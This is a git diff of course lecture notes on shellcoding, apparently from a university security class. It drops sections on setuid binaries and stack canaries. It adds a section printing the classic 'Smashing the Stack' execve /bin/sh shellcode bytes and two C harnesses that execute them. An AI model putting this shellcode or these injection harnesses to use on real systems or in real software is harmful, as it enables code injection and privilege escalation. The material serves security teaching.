@@ -1,7 +1,7 @@
 ---
-title:  "Lecture Notes: Shellcoding"
+title:  "Lecture Notes: Basics of Shellcoding"
 date:   2019-03-18 09:00:00
-categories: lecture 
+categories: notes lecture
 layout: post
 ---
 
@@ -176,6 +176,10 @@ esi+0x0    |   esi+0x0C
 
 
 
+
+
+
+
 #### Self-modifying Code??
 
 "Smashing the Stack" makes a strange comment about the code "self-modifying".
@@ -189,127 +193,33 @@ as other code and the "memory" modified by the shellcode will fall in the page
 as the shellcode.  Because of paging---specifically, all memory in the same
 page has the same permissions---this memory will also be marked as read-only.
 
+### Testing your Shellcode
 
+The code given in "Smashing the Stack" for testing the shell code is a bit
+ugly. Here's what they do (which involves overwriting the saved return address
+on the stack:
 
-### Setuid Binaries
+```C
+char shellcode[] = 
+  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" 
+  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" 
+  "\x80\xe8\xdc\xff\xff\xff/bin/sh";
 
-Why is it that we have don't have permission to read "flag.txt" but when
-exploit the binary when read "flag.txt"? In other words, why does a binary
-(that we can run) have different permissions than we do?
-
-First, let's take a look at the stack4 binary using the `file` utility: `file
-./stack4`. The output includes a curious bit of text calling stack4 a "setuid"
-ELF executable.  What does "setuid" mean here? To find out, we start the same
-way we always do on Linux: reading the MAN page. 
-
-The man page gives us more information (specifically, about the C library
-funciton, but they are related). We can see that setuid stands for set user
-identity. It allows a process to run as if it was started by a particular user
-and, consequently, run with that user's permissions.  Setuid binaries are
-useful for acheiving **priviledge escalation**. 
-
-If we run `id` we can see information about the current user, including their
-user id and group id. We can use `cat /etc/passwd` to see all of the users on
-the system. For example, we see that "root" has a userid of 0. 
-
-Fortunately, a malicious user cannot simply write a program and use setuid to
-make that program run as root. The OS has permissions in place to prevent that
-(as we can posit from looking at the errors section of the man page). So what
-is it good for? It is often used to allow an unpriviledged user to access
-hardware features or to temporarily give a user elevated priviledges, e.g.,
-`ping` and `sudo` are both setuid binaries.  For an attacker, though, if he can
-exploit a setuid binary that is running as root, then he effectively has root
-priviledges. 
-
-
-### Defending Against Code Injection
-
-How can we protect our binaries from the types of code injection attacks we
-have seen so far? Assuming we can't prevent programmers from making the
-mistakes that lead to buffer overflows, the most obvious approach is to make
-the bug harder to exploit.
-
-
-#### Stack Canaries
-
-One possible way to use something called a **stack canary**. This is a special
-value that the compiler places on the stack between the local buffers and the
-saved return address. If an attacker overflows the buffer, the idea is that the
-canary value will be overwritten. The program will check the canary value at
-the end of function execution. If that value has been modified, the program
-knows that something is wrong.   
-
-Canaries, in general, have a number of appealing qualities. First, the machine
-instructions for inserting and checking canary values can be inserted
-automatically by the compiler. In other words, the programmer does not have to
-modify her C code to use this defense (might need to set a compiler flag
-though). Second, canaries can be implemented efficiently. We will talk about
-that a bit more in just a bit.
-
-Canaries are no panacea, however. They are very limited in the types of attacks
-they can stop. For instance, canaries on the stack won't protect against other
-types of memory errors (e.g., a write-what-where style of bug) or overflows on
-the heap. Further, they won't protect against information leakage, e.g., buffer
-overflows that involve reading memory past the end of a buffer rather than
-writing information.  Further, they can be useless if the attacker can guess
-the value of the canary.
-
-#### Picking a Canary Value 
-
-One interesting design question: what value should the canary have? We usually
-don't want to the attacker to be able to guess the value; otherwise, the
-attacker could simply overflow the buffer and overwrite the canary in memory
-with the exact same value. 
-
-One way to address the guessing issue to use a random value that is determined
-at the start of the program. This value is then used for all function calls.
-These canaries are hard to guess, but vulnerable to **information leakage**.
-Of course, you also have to find a way to protect the canary value in memory.
-You can make the canary more robust by using a different random value for every
-function call, but this adds (a bunch) of additional overhead and if you had a
-magically-fast and protected region of memory you'd probably just directly save
-the return address rather than the canary (and call it a shadow stack ;).
-
-Another way to address the guessing issue is to make a
-**terminator canary** that is composed of characters like `CR, LF, null bytes`
-etc. The idea behind a terminator canary is to stymie the overflow step because
-`scanf` and other vulnerable functions will stop reading input on these
-characters and thus the attacker can't use them as part of his malicious input.
-
-
-#### Overhead of Canaries
-
-When talking about defenses, the amount of overhead a software defense adds can
-determine how likely that defense is to be used in practice. A good rule of
-thumb is that the defense must add less than 10% overhead to be adopted. Here
-we are typically more concerned about a defense's  execution overhead and not
-its storage overhead. 
-
-So why are canaries cheap? I.e., why do they have low execution overhead? To
-understand, we really need to focus on a specific implementation and look at
- - how many instructions that implementation adds (broadly)
- - how many of those instructions result in a memory access.  While we are
-   oversimplifying the analysis, in general, memory accesses are incredibly
-slow.
-
-```
-# In Proluge: grab the canary value, using the segment register to find it
-mov rax, fs:28h
-mov [rsp+38h], rax
-
-# In Epiloge: grab the correct canary, compare it to the canary on the stack
-mov rax, [rsp+38h] 
-xor rax, fs:28h
-jz ...
-call ___stack_chk_fail
-
+void main() { 
+  int *ret;
+  ret = (int *)&ret + 2; 
+  (*ret) = (int)shellcode;
+}
 ```
 
-Here we use the segment register (in part) because it allows us to set the
-canary at runtime without changing the code section.
+It is much easier to use a function pointer: 
 
-
-
+```C
+void main() { 
+  void (*s)() = (void *)shellcode;
+  s();
+}
+```
 
 
  
